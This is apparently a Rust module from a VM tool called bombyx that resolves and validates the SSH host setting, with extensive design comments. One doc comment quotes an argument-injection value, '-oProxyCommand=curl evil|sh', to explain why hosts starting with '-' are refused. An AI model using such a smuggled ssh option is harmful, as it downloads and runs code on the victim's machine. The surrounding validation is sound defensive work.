//! Where the VM host name comes from, and what shape it may take.
//!
//! The host is the one setting that is deliberately **not** in the
//! project file: it belongs to whoever drives bombyx, not to the
//! repo. So it has four possible sources with a ranking between
//! them, a charset rule, a per-developer file, and a
//! provenance answer -- roughly 250 lines that had nothing to do
//! with parsing `bombyx.toml` and made the parent module hard to
//! read at 2100 lines.
//!
//! The charset rule is here rather than at the use sites because
//! `host` reaches `ssh` and `scp` as their first positional
//! argument and neither honours `--`, so a leading `-` is read as
//! an option. One rule, reported as a field problem by
//! `super::Config::validate` and as a source problem by
//! [`super::Config::load`]; writing it once is what keeps the two
//! messages from drifting.

use std::path::{Path, PathBuf};

use serde::Deserialize;

use super::{ConfigError, Overlay, Symlinks, from_toml, read_optional};

/// Characters allowed in an SSH destination.
///
/// Deliberately narrow: an alias from `~/.ssh/config`, or a
/// `user@host` spelling.
pub(crate) fn is_host_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@')
}

/// File name of the per-developer configuration, inside the
/// directory [`user_config_dir`] returns.
pub const USER_CONFIG_FILE: &str = "config.toml";

/// Environment variable naming the VM host directly.
pub const HOST_ENV: &str = "BOMBYX_HOST";

/// Environment variable relocating the per-developer config
/// directory.
///
/// Exists so a test -- or an operator keeping several setups
/// apart -- can point bombyx at a directory of its own instead
/// of the real one.
pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";

/// The per-developer configuration file.
///
/// Only `host` for now. It is a separate shape from [`Overlay`]
/// because this file is not beside a project and cannot
/// meaningfully carry `project`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct UserFile {
    host: Option<String>,
}

/// Where a VM host name may come from, highest precedence
/// first.
///
/// The binary fills this in from its command line and
/// environment; tests construct it directly, which is why the
/// environment is a field rather than something read in place.
#[derive(Debug, Clone, Default)]
pub struct HostSources<'a> {
    /// `--host`, for a one-off run against another machine.
    pub flag: Option<&'a str>,

    /// The [`HOST_ENV`] environment variable.
    pub env: Option<&'a str>,

    /// Directory holding [`USER_CONFIG_FILE`], usually from
    /// [`user_config_dir`].
    pub user_config_dir: Option<&'a Path>,
}

/// What is wrong with a host value.
///
/// One rule, two error shapes. `Config::validate` reports it as
/// a *field* problem, and [`super::Config::load`] reports it as a
/// problem with a *source* -- naming `--host` or the file the
/// value came from. Writing the rule once is what keeps the two
/// messages from drifting apart.
pub(crate) enum HostProblem {
    /// Blank, so no host at all.
    Empty,
    /// Present but outside the allowed shape.
    Invalid(String),
}

/// Checks a host value, whatever supplied it.
///
/// `host` reaches `ssh` and `scp` as their first positional
/// argument and neither honours a `--` end-of-options separator,
/// so a leading `-` is read as an option:
/// `-oProxyCommand=curl evil|sh` runs code on this workstation
/// from a bare `bombyx status`, before any network traffic.
pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
    if value.trim().is_empty() {
        return Some(HostProblem::Empty);
    }
    if value.starts_with('-') {
        return Some(HostProblem::Invalid(
            "must not start with `-`, which ssh and scp read as \
             an option"
                .to_owned(),
        ));
    }
    if let Some(bad) = value.chars().find(|c| !is_host_char(*c)) {
        return Some(HostProblem::Invalid(format!(
            "character {bad:?} is not allowed; use only letters, \
             digits, `.`, `_`, `-` or `@`"
        )));
    }
    None
}

/// Whether an environment-supplied directory is safe to use.
///
/// Requires an anchored path: a POSIX root, a Windows root, or a
/// drive *with* a separator. Rooted spellings are checked
/// directly rather than through [`Path::is_absolute`], which
/// answers per-platform -- `C:\x` is not absolute on Unix and
/// `/x` is not absolute on Windows, while this same code reads
/// the same environment on both.
///
/// `C:cfg` is refused along with `cfg`: a drive-relative path
/// resolves against that drive's current directory, which is not
/// a location the operator chose either.
pub fn is_anchored_dir(value: &str) -> bool {
    let value = value.trim();
    if value.starts_with('/') || value.starts_with('\\') {
        return true;
    }
    let bytes = value.as_bytes();
    bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'/' || bytes[2] == b'\\')
}

/// Returns the directory holding the per-developer config.
///
/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
/// `%APPDATA%\bombyx` on Windows and
/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
/// elsewhere. `None` when the environment names no home at
/// all, which is a machine bombyx cannot guess about.
///
/// Every value must be an *anchored* path; a blank or relative
/// one counts as unset and the next source is consulted. A
/// relative value would otherwise resolve against the working
/// directory, which on this tool means taking the VM host out of
/// whatever repo bombyx was run in.
#[must_use]
pub fn user_config_dir() -> Option<PathBuf> {
    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
}

/// [`user_config_dir`] against an arbitrary environment.
///
/// `var` is split out so the precedence is testable without
/// mutating the process environment, which is global and would
/// make these tests race each other. `windows` is split out for
/// the same reason and gates `APPDATA`.
///
/// **`APPDATA` is consulted only when `windows`.** It is
/// routinely set in processes that are not Windows -- under WSL
/// via `WSLENV`, under Wine, in some CI images -- so checking it
/// unconditionally made a Linux run read a *Windows* config
/// directory in preference to `$HOME/.config`, silently taking
/// the host name from a file the docs said applied only to
/// Windows.
pub(crate) fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
where
    F: Fn(&str) -> Option<String>,
{
    // A value that is blank *or not anchored* is treated as
    // unset, and the next source is consulted.
    //
    // Blank was the original rule, for a stated reason: set to
    // "" by a launcher script it would resolve to a relative
    // `bombyx/config.toml` in the working directory, which on
    // this tool means reading a host name out of the repo -- the
    // one thing this design removes. A *non-blank relative*
    // value does exactly the same thing and was not covered:
    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
    // `XDG_CONFIG_HOME=.config` reads
    // `./.config/bombyx/config.toml`, and `..` walks out of the
    // tree. Such a value arrives from a per-directory
    // environment (`direnv`, a `mise.toml` in a clone, a CI job)
    // or a plain typo, and the host it supplies decides where
    // `up` scps an archive and where `destroy` runs `rm -rf`.
    let set = |key: &str| {
        var(key)
            .filter(|v| is_anchored_dir(v))
            .map(|v| v.trim().to_owned())
    };

    if let Some(dir) = set(CONFIG_DIR_ENV) {
        return Some(PathBuf::from(dir));
    }
    if windows {
        return set("APPDATA")
            .map(|appdata| Path::new(&appdata).join("bombyx"));
    }
    if let Some(xdg) = set("XDG_CONFIG_HOME") {
        return Some(Path::new(&xdg).join("bombyx"));
    }
    let home = set("HOME")?;
    Some(Path::new(&home).join(".config").join("bombyx"))
}

/// Which source supplied [`super::Config::host`].
///
/// Returned by [`super::Config::load`] so a caller can *report* the
/// winner instead of re-deriving it. The binary printed the
/// provenance by re-testing the flag and the environment itself,
/// which duplicated the precedence rule below in code no library
/// test could reach: rank the overlay differently here, and the
/// message kept naming the old winner.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HostOrigin {
    /// The `--host` flag.
    Flag,
    /// The [`HOST_ENV`] environment variable.
    Env,
    /// A `bombyx.local.toml` beside the project file.
    Overlay,
    /// The per-developer [`USER_CONFIG_FILE`].
    UserFile,
}

impl std::fmt::Display for HostOrigin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let name = match self {
            Self::Flag => "--host",
            Self::Env => HOST_ENV,
            Self::Overlay => "bombyx.local.toml",
            Self::UserFile => USER_CONFIG_FILE,
        };
        f.write_str(name)
    }
}

/// Finds the VM host, highest-precedence source first.
///
/// `local` is the overlay's path, named only in the
/// no-host-anywhere error.
///
/// Takes the overlay by `&mut` and *removes* the host it finds,
/// so the value is consumed where it is ranked. What is left
/// provably carries no host, which is what makes
/// `Config::with_overlay` ignoring the field safe rather than
/// merely intended.
///
/// The per-developer file is read *last* and only if it is
/// needed, so `--host` works on a machine whose file is absent
/// or broken.
///
/// A blank [`HOST_ENV`] counts as unset. An exported-but-empty
/// variable is how a shell says "no value", and reporting "no
/// VM host configured" is more use than an empty-field error.
/// A host supplied directly by the caller is *not* treated that
/// way: it was asked for, so the empty-value error names it.
pub(crate) fn resolve_host(
    sources: &HostSources,
    overlay: Option<&mut Overlay>,
    local: Option<&Path>,
) -> Result<(String, HostOrigin), ConfigError> {
    if let Some(host) = sources.flag {
        return Ok((host.to_owned(), HostOrigin::Flag));
    }
    if let Some(host) = sources.env.filter(|v| !v.trim().is_empty()) {
        return Ok((host.to_owned(), HostOrigin::Env));
    }
    if let Some(host) = overlay.and_then(|o| o.host.take()) {
        return Ok((host, HostOrigin::Overlay));
    }
    if let Some(dir) = sources.user_config_dir {
        let path = dir.join(USER_CONFIG_FILE);
        if let Some(source) = read_optional(&path, Symlinks::Follow)? {
            let file: UserFile = from_toml(&source, &path)?;
            if let Some(host) = file.host {
                return Ok((host, HostOrigin::UserFile));
            }
        }
    }
    Err(ConfigError::HostMissing {
        places: host_places(sources, local),
    })
}

/// Names the files that can carry a host, for an error message.
///
/// Both are paths the operator can act on, so they are printed
/// in full rather than described.
pub(crate) fn host_places(
    sources: &HostSources,
    local: Option<&Path>,
) -> String {
    let user = sources.user_config_dir.map(|d| d.join(USER_CONFIG_FILE));
    match (user, local) {
        (Some(user), Some(local)) => {
            format!("{} or {}", user.display(), local.display())
        }
        (Some(user), None) => user.display().to_string(),
        (None, Some(local)) => local.display().to_string(),
        // No home directory in the environment and no project
        // file with a name, so there is nothing concrete to
        // point at.
        (None, None) => {
            format!("a {USER_CONFIG_FILE} in your config directory")
        }
    }
}
